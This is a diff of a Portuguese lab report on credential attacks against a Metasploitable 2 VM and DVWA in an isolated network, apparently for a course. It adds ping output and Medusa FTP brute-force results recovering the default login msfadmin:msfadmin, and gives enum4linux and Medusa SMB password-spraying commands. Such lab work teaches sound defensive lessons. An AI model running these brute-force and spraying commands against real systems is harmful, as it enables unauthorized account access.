@@ -23,9 +23,27 @@ Demonstrar a compreensão teórica e prática sobre os conceitos de autenticaç�
 
 ![Evidência do IP do Metasploitable](foto.png)
 
-eth0 Link encap:Ethernet HWaddr 52:54:00:29:40:47
-inet addr:192.168.122.143 Bcast:192.168.122.255 Mask:255.255.255.0
+eth0 Link encap:Ethernet HWaddr 52:54:00:44:65:7c
+inet addr:192.168.122.226 Bcast:192.168.122.255 Mask:255.255.255.0
 
+
+### Teste de conectividade (Kali → Metasploitable)
+
+```bash
+ping -c 4 192.168.122.226
+```
+
+PING 192.168.122.226 (192.168.122.226) 56(84) bytes of data.
+64 bytes from 192.168.122.226: icmp_seq=1 ttl=64 time=1.51 ms
+64 bytes from 192.168.122.226: icmp_seq=2 ttl=64 time=0.908 ms
+64 bytes from 192.168.122.226: icmp_seq=3 ttl=64 time=0.805 ms
+64 bytes from 192.168.122.226: icmp_seq=4 ttl=64 time=0.848 ms
+
+--- 192.168.122.226 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3031ms
+
+
+Conectividade confirmada entre as duas VMs, 0% de perda de pacotes.
 
 ---
 
@@ -69,39 +87,46 @@ toor
 
 Comando utilizado:
 ```bash
-medusa -h 192.168.122.143 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
+medusa -h 192.168.122.226 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
 ```
 
 **Resultado:**
-> _(cole aqui o print/resultado do terminal mostrando o login encontrado)_
+
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net
+
+2026-10-27 02:44:38 ACCOUNT CHECK: [ftp] Host: 192.168.122.226 User: msfadmin Password: msfadmin
+2026-10-27 02:44:38 ACCOUNT FOUND: [ftp] Host: 192.168.122.226 User: msfadmin Password: msfadmin [SUCCESS]
+
+
+O Medusa identificou a credencial válida logo na primeira combinação testada (`msfadmin:msfadmin`), evidenciando o uso de uma credencial padrão fraca exposta no serviço de FTP do Metasploitable 2 — um risco comum em ambientes com configurações default não alteradas.
 
 ### 2. Password Spraying em SMB com enumeração de usuários
 
 Enumeração de usuários:
 ```bash
-enum4linux -U 192.168.122.143
+enum4linux -U 192.168.122.226
 ```
 
 Password spraying:
 ```bash
-medusa -h 192.168.122.143 -U wordlists/usuarios_enumerados.txt -p msfadmin -M smbnt
+medusa -h 192.168.122.226 -U wordlists/usuarios.txt -p msfadmin -M smbnt
 ```
 
 **Resultado:**
-> _(cole aqui o print/resultado da enumeração e do spray)_
+> _(pendente — rodar os comandos acima e colar aqui)_
 
 ### 3. Automação de tentativas em formulário Web (DVWA)
 
 - DVWA configurado com nível de segurança **Low**, para fins didáticos.
-- Módulo de login acessado em `http://192.168.122.143/dvwa/login.php`.
+- Módulo de login acessado em `http://192.168.122.226/dvwa/login.php`.
 
 Comando/método utilizado:
 ```bash
-# (cole aqui o comando do Medusa com módulo web-form, ou a configuração usada no Burp Intruder)
+# (pendente — comando do Medusa com módulo web-form, ou configuração usada no Burp Intruder)
 ```
 
 **Resultado:**
-> _(cole aqui o print/resultado do ataque ao formulário)_
+> _(pendente — rodar o ataque e colar aqui)_
 
 ---
 
